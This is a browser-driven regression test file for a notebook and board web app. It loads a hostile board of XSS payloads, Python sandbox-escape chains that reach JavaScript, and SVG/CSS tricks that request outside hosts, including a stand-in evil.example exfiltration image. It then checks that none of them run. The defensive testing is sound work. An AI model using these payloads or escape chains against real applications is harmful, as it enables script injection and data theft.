// A hostile board (as ?doc= may load from anywhere): markup and script in
// every field, numbers that are strings, colors that are CSS, links that are
// javascript:.  Shown, edited, printed and exported: nothing runs, and no
// element the document did not ask for appears.  Serve web/dist first
// (python3 web/serve.py 8765), then
//   node web/board/test-xss.mjs
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const base = process.env.SB_URL ?? "http://127.0.0.1:8765/";
const port = 9456, sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const profile = mkdtempSync(join(tmpdir(), "sb-xss-prof-"));
const chrome = spawn(process.env.CHROME ?? "chromium", ["--headless", "--no-sandbox", `--remote-debugging-port=${port}`, "--window-size=1280,800", `--user-data-dir=${profile}`, "about:blank"], { stdio: "ignore" });
let targets;
for (let i = 0; i < 300; i++) { try { targets = await (await fetch(`http://127.0.0.1:${port}/json`)).json(); break; } catch { await sleep(100); } }
const ws = new WebSocket(targets.find((t) => t.type === "page").webSocketDebuggerUrl);
await new Promise((r) => (ws.onopen = r));
let n = 0; const waiting = new Map(); const dialogs = [], probes = [];
ws.onmessage = (ev) => {
  const m = JSON.parse(ev.data);
  if (m.id && waiting.has(m.id)) { waiting.get(m.id)(m.result ?? m.error); waiting.delete(m.id); }
  if (m.method === "Network.requestWillBeSent" && /sb-probe/.test(m.params.request.url)) probes.push(m.params.request.url);
  if (m.method === "Page.javascriptDialogOpening") { dialogs.push(m.params.message); send("Page.handleJavaScriptDialog", { accept: true }); }
};
const send = (method, params = {}) => new Promise((r) => { const id = ++n; waiting.set(id, r); ws.send(JSON.stringify({ id, method, params })); });
const ev = async (expression) => { const r = await send("Runtime.evaluate", { expression, awaitPromise: true, returnByValue: true }); if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails).slice(0, 400)); return r.result.value; };
const fails = [];
let checks = 0;
const check = (ok, what) => { checks++; if (!ok) fails.push(what); };
const X = (k) => `<img src=x onerror="window.__xss.push('${k}')"><script>window.__xss.push('${k}s')</script><svg onload="window.__xss.push('${k}v')">`;
const hostile = {
  title: X("title"), intro: X("intro") + " [l](javascript:window.__xss.push('introlink'))", refBase: "javascript:window.__xss.push('refbase')//",
  nodes: [
    { id: "a", title: X("a-title"), text: X("a-text") + " <a href='javascript:window.__xss.push(1)'>x</a>", detail: X("a-detail"), ref: "javascript:window.__xss.push('ref')", color: "red;background:url(javascript:window.__xss.push('css'))", shape: "rect\" onmouseover=\"window.__xss.push('shape')", x: "1\"><img src=x onerror=\"window.__xss.push('x')\">", y: 0 },
    { id: "g", kind: "group", title: X("g"), text: X("g-text"), color: "url(javascript:1)", x: "0\"/><image href=x onerror=\"window.__xss.push('gx')\"/><rect x=\"0", y: 300, children: [{ id: "b", text: "**fine** <span style=\"color:green\">green</span>", w: "300\"><img src=x onerror=\"window.__xss.push('w')\">" }] },
    { id: "c", kind: "code", code: "print('<img src=x onerror=1>')\nfrom IPython.display import HTML, Markdown, display\ndisplay(HTML('<b>bold</b><img src=x onerror=\"window.__xss.push(\\'html\\')\"><script>window.__xss.push(\\'htmls\\')</script>'))\ndisplay(Markdown('![leak](https://evil.example/?data=secret) <img src=x onerror=\"window.__xss.push(\\'md\\')\">'))" },
    // Python reaching JavaScript in the worker (sagebrush-daybreak's SEC-983-1 and -2): each would tell the page
  ...[["e1", `class L(list):\n    pass\ndef ctor(o):\n    return o.constructor\na = L()\na.constructor = None\nctor(a)\nb = L()\nArray = ctor(b)\nsetattr(b, "__proto__", Array)\nctor(b)("new BroadcastChannel('sbx').postMessage('proto')")()`],
      ["e2", `import os, sys\nd = "/sbx\\nnew BroadcastChannel('sbx').postMessage('sourceurl');true?(()=>{}):0"\nos.makedirs(d, exist_ok=True)\nwith open(d + "/sbxm.py", "w") as f:\n    f.write("x = 1\\n")\nsys.path.insert(0, d)\nimport sbxm\nprint("imported", sbxm.x)`],
      // (SEC-18F-1, sagebrush-daybreak's chain at 18f5216: globals() forging the runtime's $cls)
      ["e3", `import sys\nclass L(list): pass\nclass D(dict): pass\nclass Q(property): pass\ndef leak(o):\n    return (o.constructor, o.__lookupSetter__, o.__defineGetter__, o.__defineSetter__)\nm, g = sys.modules[__name__], globals()\nfor name in ("constructor", "__lookupSetter__", "__defineGetter__", "__defineSetter__"):\n    g[name] = None\ng["$cls"] = L\nleak(m)\nArray, lookup_setter, define_getter, define_setter = leak(L())\nx = Q()\nx.get = lookup_setter\ng["$cls"], g["$m"] = D, x\nproto_setter = m["__proto__"]\nx.set = define_getter\nm["$cls"] = lambda: Q\nx.set = define_setter\nm["fget"] = proto_setter\nproperty.__init__(x, Array)\ng["$cls"] = Q\nleak(m)\nFunction = leak(x)[0]\nFunction("new BroadcastChannel('sbx').postMessage('cache')")()`],
      // (SEC-5DE-1, sagebrush-daybreak's import chain at 5deaa70: a loader writing $ctor/$cls)
      ["e4", `import sys\nclass Hook:\n    values = {}\n    def find_spec(self, name, *a):\n        if name in self.values:\n            self.name = name\n            return self\n    def create_module(self, spec):\n        return self.values[self.name]\n    def exec_module(self, m):\n        pass\nh = Hook(); h.loader = h\nsys.meta_path.insert(0, h)\ndef plant(parent, slot, value):\n    sys.modules["p"] = parent\n    sys.modules.pop("p." + slot, None)\n    h.values["p." + slot] = value\n    __import__("p." + slot)\nclass C: pass\ndef carrier(): pass\nplant(C, "$ctor", carrier)\no = object.__new__(C)\nplant(o, "$cls", C)\no.constructor = None\ndef read(o): return o.constructor\nread(o)\nplant(carrier, "$cls", C)\nread(carrier)("new BroadcastChannel('sbx').postMessage('import')")()`],
      // (SEC-2C5-1, sagebrush-daybreak at 2c5ccc1: __pyjs_run__ globals through a function's prototype)
      ["e5", `def fn(): pass\ntry:\n    out, err = __pyjs_run__("Function = constructor\\nFunction(\\"new BroadcastChannel('sbx').postMessage('runhelper')\\")()", fn, False)\nexcept TypeError:\n    print("refused")`]]
    .map(([id, code], i) => ({ id, kind: "code", code, x: 900 + 400 * i, y: 600 })),
  ],
  edges: [{ from: "a", to: "b", label: X("edge") }, { from: "b", to: "c", label: "</text><script>window.__xss.push('svg')</script>" }],
  steps: [{ focus: "a", say: X("step") }],
  tools: ["note", "<img src=x onerror=1>"],
};
try {
  for (const m of ["Page.enable", "Runtime.enable"]) await send(m);
  await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__xss = []; window.__sbx = []; new BroadcastChannel('sbx').onmessage = (e) => window.__sbx.push(e.data);" });
  await send("Page.navigate", { url: `${base}board/?mermaid=${encodeURIComponent("flowchart LR\n a --> b")}` });
  for (let i = 0; i < 300 && !(await ev("!!window.sagebrush?.board?.snapshot().items.length").catch(() => false)); i++) await sleep(100);
  await ev(`window.sagebrush.board.load(${JSON.stringify(hostile)})`);
  await sleep(1500);
  await ev("window.board.focus(undefined, true)");
  await sleep(800);
  // (code ran: its outputs shown in their item)
  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => ['c', 'e1', 'e2', 'e3', 'e4', 'e5'].every((id) => o.some((x) => x.id === id && x.state === '' && x.output)))")); i++) await sleep(100);
  const outs = await ev("window.sagebrush.board.outputs()");
  check(/AttributeError/.test(outs.find((x) => x.id === "e1")?.output ?? ""), `SEC-983-1: the inherited constructor is no attribute: ${JSON.stringify(outs.find((x) => x.id === "e1"))}`.slice(0, 300));
  check(/TypeError/.test(outs.find((x) => x.id === "e3")?.output ?? ""), `SEC-18F-1: globals() takes no runtime $ name: ${JSON.stringify(outs.find((x) => x.id === "e3"))}`.slice(0, 300));
  check(/ModuleNotFoundError/.test(outs.find((x) => x.id === "e4")?.output ?? ""), `SEC-5DE-1: importing takes no runtime $ name: ${JSON.stringify(outs.find((x) => x.id === "e4"))}`.slice(0, 300));
  check(/refused/.test(outs.find((x) => x.id === "e5")?.output ?? ""), `SEC-2C5-1: __pyjs_run__ refuses a function globals: ${JSON.stringify(outs.find((x) => x.id === "e5"))}`.slice(0, 300));
  check(/imported 1/.test(outs.find((x) => x.id === "e2")?.output ?? ""), `SEC-983-2: the module imports: ${JSON.stringify(outs.find((x) => x.id === "e2"))}`.slice(0, 300));
  check((await ev("window.__sbx")).length === 0, `Python ran JavaScript in the worker: ${JSON.stringify(await ev("window.__sbx"))}`);
  await ev("window.board.focus(['c'], true)");
  await sleep(800);
  await ev("window.sagebrush.board.editing(true)");
  await ev("window.sagebrush.board.step(0)");
  await sleep(600);
  await ev("window.sagebrush.board.print({ dialog: false })");
  await sleep(800);
  const html = await ev("window.sagebrush.board.exportHtml()");
  check(typeof html === "string" && html.length > 1000, "the board exports");
  // nothing ran
  check(!dialogs.length, `dialogs: ${dialogs.join(", ")}`);
  const ran = await ev("window.__xss");
  check(ran.length === 0, `script ran: ${JSON.stringify(ran)}`);
  // no element with a handler, no script, no javascript: link, no remote image from code
  const found = await ev(`(() => {
    const bad = [];
    for (const el of document.querySelectorAll("*")) {
      for (const a of el.attributes) if (/^on/i.test(a.name)) bad.push(el.tagName + "[" + a.name + "]");
      if ((el.tagName === "A" || el.tagName === "a") && /^\\s*javascript:/i.test(el.getAttribute("href") ?? "")) bad.push("a[href=javascript]");
      if (el.tagName === "SCRIPT" && !el.src && !/sagebrush|board/.test(el.textContent.slice(0, 200)) && el.closest(".board, #board-print, .board-item")) bad.push("inline script");
      if (el.tagName === "IMG" && /evil\\.example/.test(el.getAttribute("src") ?? "")) bad.push("remote image from code");
    }
    return bad;
  })()`);
  check(found.length === 0, `elements: ${found.join(", ")}`);
  // (the document as kept: only data)
  const d = await ev("window.sagebrush.board.snapshot().doc");
  check(d.nodes[0].x === undefined && d.nodes[0].color === undefined && d.nodes[0].shape === undefined, `hostile fields kept: ${JSON.stringify({ x: d.nodes[0].x, color: d.nodes[0].color, shape: d.nodes[0].shape })}`);
  check(await ev("document.querySelectorAll('.board-item span[style]').length") >= 1, "the safe formatting (a colored span) is kept");
  // outputs that would load from another site (SEC-983-3, -4, -5): none may make a request
  await send("Network.enable");
  await send("Page.navigate", { url: base });
  for (let i = 0; i < 400 && !(await ev("!!window.sagebrush?.notebook?.output").catch(() => false)); i++) await sleep(100);
  const probe = (k) => `http://127.0.0.1:9/sb-probe-${k}`;
  const bundles = [
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u\\72 l(${probe("style")})"/></svg>` },
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="u\\72 l(${probe("fill")})"/></svg>` },
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u/**/rl(${probe("comment")});background-image:image-set('${probe("imageset")}' 1x)"/></svg>` },
    // (relative addresses: requests to this site, as daybreak found at 18f5216)
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="background-image:image-set('sb-probe?d=secret' 1x)"/><rect width="9" height="9" style="background-image:-webkit-image-set('sb-probe-webkit' 1x)"/><rect width="5" height="5" cursor="image-set('sb-probe-cursor-attr' 1x),auto"/></svg>` },
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="cursor:image-set('sb-probe-rel-cursor' 1x),auto;fill:red"/><rect width="9" height="9" style="background-image:image('sb-probe-rel-image')" fill="cross-fade('sb-probe-rel-fade', red)"/></svg>` },
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink"><use x:href="${probe("xlink")}#x"/><image x:href="${probe("ximage")}" width="5" height="5"/><g xml:base="${probe("base")}/"><use href="other.svg#x"/></g></svg>` },
    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:q="http://www.w3.org/1999/xlink"><defs><linearGradient id="g"/></defs><rect width="9" height="9" fill="url(#g)" mask="url('${probe("mask")}')"/><use q:href="#g"/></svg>` },
    { "image/svg+xml": "<svg xmlns='http://www.w3.org/2000/svg' width='20' height='20'/>", "application/vnd.sagebrush.scene3d+json": JSON.stringify({ lo: [0, 0, 0], hi: [1, 1, 1], scale: [1, 1, 1], frame: false,
      objects: [{ type: "text2", mode: "2d", position: [0.5, 0.5], text: "probe", size: 1, color: `red;background-image:url(${probe("scene")})` }] }) },
  ];
  const kept = await ev(`(async () => {
    const box = document.body.appendChild(document.createElement("div"));
    for (const b of ${JSON.stringify(bundles)}) window.sagebrush.notebook.output.display(box, b);
    await new Promise((r) => setTimeout(r, 2500));
    return { refs: box.querySelectorAll("[fill^='url(#s'], use[href^='#s']").length, labels: [...box.querySelectorAll("span")].filter((s) => s.textContent === "probe").map((s) => s.style.color) };
  })()`);
  await sleep(500);
  check(probes.length === 0, `outputs loaded from another site: ${probes.join(", ")}`);
  check(kept.refs >= 1, `a picture's own references (url(#id), #id) are kept: ${JSON.stringify(kept)}`);
  // the site's own pages run under their Content-Security-Policy without a single violation
  for (const [path, ready] of [["", "window.sagebrush?.kernel?.ready"], ["board/?doc=examples%2Flive.json", "window.sagebrush?.board?.outputs?.().then((o) => o.length && o.every((x) => x.state === '' ))"], ["embed/", "document.querySelectorAll('.sbnb .cell').length > 0"]]) {
    await send("Page.addScriptToEvaluateOnNewDocument", { source: "window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));" });
    await send("Page.navigate", { url: base + path });
    for (let i = 0; i < 400 && !(await ev(ready).catch(() => false)); i++) await sleep(100);
    await sleep(1500);
    const csp = await ev("fetch(location.href).then((r) => r.headers.get('content-security-policy'))");
    check(!!csp, `/${path} has a Content-Security-Policy`);
    const v = await ev("window.__csp");
    check(v.length === 0, `/${path}: CSP violations: ${v.join(", ")}`);
  }
} catch (e) {
  fails.push(String(e?.stack ?? e));
} finally {
  chrome.kill();
  await sleep(200);
  rmSync(profile, { recursive: true, force: true });
}
console.log(`${checks - fails.length}/${checks} checks passed`);
for (const f of fails) console.log("FAIL", f);
process.exit(fails.length ? 1 : 0);
